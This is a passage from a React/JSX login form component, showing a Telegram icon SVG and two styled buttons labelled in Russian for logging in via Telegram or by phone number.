                  <path d="M12 2C6.48 2 2 6.48 2 12c0 5.52 4.48 10 10 10s10-4.48 10-10c0-5.52-4.48-10-10-10zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.65-.35-1.01.22-1.59.15-.15 2.71-2.48 2.76-2.69a.2.2 0 00-.05-.18c-.06-.05-.14-.03-.21-.02-.09.02-1.49.95-4.22 2.79-.4.27-.76.41-1.08.4-.36-.01-1.04-.2-1.55-.37-.63-.2-1.12-.31-1.08-.66.02-.18.27-.36.74-.55 2.92-1.27 4.86-2.11 5.83-2.51 2.78-1.16 3.35-1.36 3.73-1.36.08 0 .27.02.39.12.1.08.13.19.14.27-.01.06.01.24 0 .38z" />
                </svg>
                <span>Войти через Telegram</span>
              </button>

              <button
                type="button"
                className="w-full h-14 bg-[#1a1a1a] hover:bg-[#252525] text-white rounded-2xl flex items-center justify-center gap-3 transition-colors"
              >
                <svg className="w-5 h-5" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                  <rect x="5" y="2" width="14" height="20" rx="2" ry="2" />
                  <line x1="12" y1="18" x2="12.01" y2="18" />
                </svg>
                <span>Войти по номеру телефона</span>
              </button>
            </div>
          </div>
        </form>
      </div>
    </div>
  )
}
